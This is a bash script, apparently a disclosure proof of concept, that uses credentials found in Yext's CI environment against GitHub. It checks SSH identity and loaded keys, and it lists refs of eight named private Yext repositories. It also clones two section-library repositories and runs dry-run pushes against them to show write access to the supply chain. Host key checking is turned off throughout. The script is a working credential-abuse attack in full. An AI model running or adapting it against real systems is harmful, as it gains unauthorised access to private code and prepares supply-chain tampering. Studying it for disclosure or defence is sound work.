#!/usr/bin/env bash
# Yext CI credential IMPACT demonstration. Non-destructive:
#  - ls-remote  = read probe, returns ref names only, no source cloned
#  - push --dry-run = write-permission probe; GitHub authorizes git-receive-pack before any
#    object transfer, so this reveals permission WITHOUT creating or changing any ref
set +e
B="YEXTPOC7731"
echo "$B-BEGIN"

echo "$B === IDENTITY ==="
id 2>&1
ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=15 -T git@github.com 2>&1
ssh-add -l 2>&1

echo "$B === READ PROBE: private Yext repos (refs only, nothing cloned) ==="
for R in yext/yext yext/sites yext/pages yext/visual-editor yext/yextve \
         yext/pages-visual-editor-starter yext/sites-starter yext/deps; do
  printf '%-42s ' "$R"
  OUT=$(GIT_SSH_COMMAND='ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=15' \
        git ls-remote "git@github.com:$R.git" 2>&1 | head -2 | tr '\n' ' ')
  echo "$OUT"
done

echo "$B === WRITE PROBE: section-library supply chain (DRY RUN, nothing is written) ==="
export GIT_SSH_COMMAND='ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=15'
for R in yext-section-libraries/standard-library yext-section-libraries/bar-social-dining; do
  echo "--- $R ---"
  rm -rf /tmp/wt && git clone -q --depth 1 "git@github.com:$R.git" /tmp/wt 2>&1 | head -2
  if [ -d /tmp/wt ]; then
    ( cd /tmp/wt && git push --dry-run origin HEAD:refs/heads/poc7731-writetest 2>&1 | head -6 )
  fi
  rm -rf /tmp/wt
done

echo "$B-END"
exit 0
